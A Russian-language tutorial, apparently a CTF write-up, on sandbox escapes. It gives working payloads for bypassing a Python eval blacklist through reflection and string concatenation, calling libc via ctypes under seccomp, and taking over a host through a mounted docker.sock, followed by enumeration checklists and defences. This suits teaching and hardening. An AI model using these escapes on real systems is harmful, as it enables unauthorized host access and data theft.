## Вопрос, с которого всё начинается

Мы выходили из джейлов на уровне интерпретатора: фильтр слов, чёрный список функций. Но песочница может быть устроена **ниже** — на уровне процесса или контейнера. Тогда Python-трюки не помогут: даже получив «выполнение кода», вы упрётесь в запрет системных вызовов. Как понять, где именно проходит граница, и как её искать?

## Наш пример: eval-песочница сервиса

Задача даёт сервис, который принимает выражение и исполняет его:

```python
blacklist = ['import', 'os', 'system', 'open', 'subprocess']
expr = input(">>> ")
if any(b in expr for b in blacklist):
    print("blocked"); exit()
print(eval(expr))
```

Прямые попытки блокируются, но подстроки обходятся. Строим payload по шагам. Сначала убеждаемся, что доступна объектная модель:

```python
>>> ().__class__.__base__.__subclasses__()
[<class 'type'>, <class 'weakref'>, ..., <class 'warnings.catch_warnings'>]
```

Список вернулся — рефлексия доступна. Это уже языковая песочница, а не системная.

## Шаг 1: от рефлексии к builtins

Найдём класс, через который достаются встроенные функции. У `catch_warnings` есть `__init__.__globals__` со словарём `__builtins__`:

```python
>>> [c for c in ().__class__.__base__.__subclasses__() if c.__name__=='catch_warnings'][0]()._module.__builtins__['__import__']('os').system('cat /flag')
```

Проверяем на фильтр: подстроки `import`, `os`, `system` здесь есть? `__import__` содержит `import` — фильтр заблокирует. Значит, собираем имена динамически:

```python
>>> g = getattr
>>> bi = [c for c in ().__class__.__base__.__subclasses__() if c.__name__=='catch_warnings'][0]()._module.__builtins__
>>> g(bi, '__imp'+'ort__')('o'+'s').system('cat /flag')
```

`'__imp'+'ort__'` не содержит подстроки `import` целиком, поэтому фильтр пропускает. Если и `system` заблокировано — берём `popen`, затем `subprocess.check_output`, а если совсем ничего — читаем файл:

```python
>>> g(bi, 'op'+'en')('/flag').read()
```

## Шаг 2: какие бывают уровни изоляции

Важно различать уровни — от них зависит вся стратегия:

- **языковая песочница** — чёрный список функций внутри интерпретатора (наш пример);
- **процессная изоляция** — `seccomp`, `chroot`, отдельный пользователь;
- **контейнерная изоляция** — Docker, namespaces, cgroups;
- **виртуализация** — VM и гипервизор.

CTF-задачи чаще всего про первый и второй уровень. Наш сервис — первый: мы победили его рефлексией.

## Шаг 3: seccomp — когда запрещены системные вызовы

**seccomp** (secure computing) — механизм ядра, который ограничивает набор доступных **системных вызовов** (syscall). Если фильтр запрещает `execve` и `open`, то `os.system('cat /flag')` не сработает: ядро отклонит вызов, даже если Python его выполнит.

В таком случае ищут примитивы, которые фильтр не покрыл. Классика — `ctypes`: через него вызывают libc напрямую:

```python
>>> import ctypes
>>> ctypes.CDLL(None).system(b'cat /flag')
```

`ctypes.CDLL(None)` открывает основной образ процесса, а `system` из libc делает тот же syscall — если seccomp его не режет, побег удался. Если режет — ищите незакрытые вызовы: `openat` вместо `open`, `read`/`write`, `sendfile`.

## Шаг 4: контейнеры и docker.sock

Для контейнерных задач граница проходит по монтированиям и правам. Самая частая ошибка — примонтированный сокет Docker:

```
$ ls -l /var/run/docker.sock
srw-rw---- 1 root docker 0 ... /var/run/docker.sock
```

Через этот сокет можно управлять демоном хоста — запускать контейнеры с монтированием корня. Это полноценный побег, а не «дыра в языке». Другие пути: привилегированный контейнер (`--privileged`), лишние capabilities (`CAP_SYS_ADMIN`), доступ к `/proc` хоста.

## Шаг 5: как читать traceback в свою пользу

Когда payload падает, интерпретатор печатает traceback с именами модулей и путей. Это карта доступного пространства. Ошибка `AttributeError: 'X' object has no attribute 'Y'` подсказывает, какие атрибуты есть; ошибка импорта — какие модули загружены. В песочницах, где вывод фильтруется, данные прячут в исключении: `raise Exception(open('/flag').read())` — traceback часто печатается даже при запрете вывода.

## Шаг 6: если не сработало

- **Всё очевидное закрыто.** Ищите неочевидное: `ctypes`, `pickle`, `pty`, уже загруженные модули в `sys.modules`.
- **`__builtins__` пуст.** Ищите функцию с `__globals__`, ведущим к настоящим builtins.
- **`ctypes` убран.** Ищите другие модули-мосты: `subprocess`, `pty`, `pickle`.
- **Есть аудит-хук.** Ищите непокрытые события или атакуйте уже скомпилированный код.
- **Ограничение длины.** Сжимайте payload, используйте переменные.

## Практический пример: побег из контейнера через сокет

Разберём контейнерный сценарий. Мы внутри Docker-контейнера, и задача — прочитать файл хоста. Проверяем монтирования:

```
$ mount | grep -i docker
$ ls -l /var/run/docker.sock
```

Если сокет примонтирован, через него можно управлять демоном хоста:

```
$ docker -H unix:///var/run/docker.sock run -v /:/host --rm alpine cat /host/flag
```

Мы просим демон запустить новый контейнер с примонтированным корнем хоста и читаем флаг. Это уже не «дыра в языке», а ошибка конфигурации: сокет даёт полный контроль над хостом.

Другие пути: привилегированный контейнер (`--privileged`) позволяет монтировать устройства и менять ядро; лишние capabilities (`CAP_SYS_ADMIN`) открывают монтирование и `chroot`; доступ к `/proc` хоста (при `--pid=host`) раскрывает процессы. Первый шаг всегда один — картировать окружение: `capsh --print`, `cat /proc/self/status | grep Cap`, `ls /dev`.

## Что мы теперь знаем

По-простому:

1. Первый шаг — картировать уровень изоляции: язык, процесс или контейнер.
2. Языковые песочницы ломаются рефлексией к builtins и обходом фильтров конкатенацией.
3. `seccomp` ограничивает syscall; обходят через `ctypes`/libc и незакрытые вызовы.
4. В контейнерах ищут монтирования, `docker.sock` и лишние capabilities.
5. Traceback — карта окружения; данные прячут в исключениях.

## На что смотреть дальше

- **Фильтр по подстрокам** — обходится конкатенацией и `getattr`.
- **Альтернативные точки входа** — `globals`, `vars`, `__import__`, `sys.modules`.
- **Версия языка** — поведение рефлексии отличается.
- **Ошибки как источник** — traceback подсказывает доступные имена.
- **«Функция удалена»** — она может быть доступна через `__builtins__`.

## Справочник: уровни изоляции

Песочницы строят по возрастанию строгости. Полезно понимать, что именно ломает каждый уровень:

| Уровень | Механизм | Что ломает |
|---|---|---|
| `eval` в Python | ограничение имён | объектная модель (`__subclasses__`) |
| restricted Python | чёрный/белый список | обход через алиасы |
| seccomp | фильтр сисколлов | разрешённый сисколл как обход |
| namespaces/cgroups | контейнер | `docker.sock`, утечка прав |
| микро-ВМ (gVisor) | отдельное ядро | редко, сложнее всего |
| полная ВМ | аппаратная изоляция | только уязвимость гипервизора |

Правило: **чем ближе песочница к процессу, тем легче из неё выйти**. Настоящая изоляция — это отдельное ядро или машина, а не фильтр строк.

## Мини-практика: побег через docker.sock

Самый частый практический побег из контейнера — не сломанный seccomp, а смонтированный внутрь `docker.sock`. Если он доступен, из контейнера можно управлять хостом:

```
$ ls -l /var/run/docker.sock
srw-rw---- 1 root docker 0 ... /var/run/docker.sock
$ curl --unix-socket /var/run/docker.sock http://localhost/version
{"Version":"24.0.7","ApiVersion":"1.43",...}
```

Ответ означает: сокет жив и доступен. Через него поднимают новый контейнер с монтированием корня хоста и получают файловую систему хоста. Защита здесь не в коде, а в том, **чтобы не монтировать сокет внутрь**.

## Частые ошибки

- **Считать seccomp полной защитой.** Разрешённые сисколлы можно комбинировать для побега.
- **Оставлять `docker.sock`.** Это прямой доступ к хосту, а не «удобство».
- **Читать traceback как провал.** Он показывает, где фильтр сработал, — это подсказка, а не тупик.
- **Игнорировать права.** Побег из-под root в контейнере и из-под непривилегированного пользователя — разные задачи.

## Мини-практика: полный побег из контейнера по шагам

Соберём путь от «мы внутри контейнера» до «мы на хосте»:

1. **Осмотр.** `id`, `ls -la /`, наличие `/var/run/docker.sock` или монтирований хоста.
2. **Капабилити.** `capsh --print` покажет `CAP_SYS_ADMIN` и подобное.
3. **Выбор пути.** Есть `docker.sock` → через Docker API; есть `CAP_SYS_ADMIN` → через монтирование; иначе — уязвимость ядра.
4. **Реализация.** Через сокет поднимаем контейнер с монтированием `/` хоста.
5. **Проверка.** `ls /host/root` — читаем файлы хоста.

Вывод: контейнер без лишних привилегий и без смонтированного сокета — реальная граница; контейнер с ними — нет.

## Чем защищаются на практике

- **Не монтировать `docker.sock`** внутрь рабочих контейнеров.
- **Rootless-контейнеры** и непривилегированный пользователь внутри.
- **Drop всех capabilities**, вернуть только нужные.
- **seccomp-профиль** по умолчанию (не `unconfined`).
- **Read-only rootfs** и лимиты ресурсов.

## Шпаргалка: чек-лист проверки контейнера

- `id` и `capsh --print` — пользователь и capabilities.
- `ls -la /var/run/docker.sock` — доступ к Docker.
- `cat /proc/1/cgroup` — тип изоляции.
- `mount` — что смонтировано с хоста.
- `cat /proc/self/status | grep Seccomp` — профиль seccomp.
- `env` — нет ли подсказок про хост и оркестратор.
- `ls -la /` — нет ли смонтированных путей хоста.
- `cat /proc/1/status | grep Cap` — активные capabilities процесса.
- `find / -name '*.sock' 2>/dev/null` — все доступные сокеты.
- `cat /proc/self/mountinfo` — все монтирования с хоста.
- Проверь, включён ли rootless-режим у контейнера.
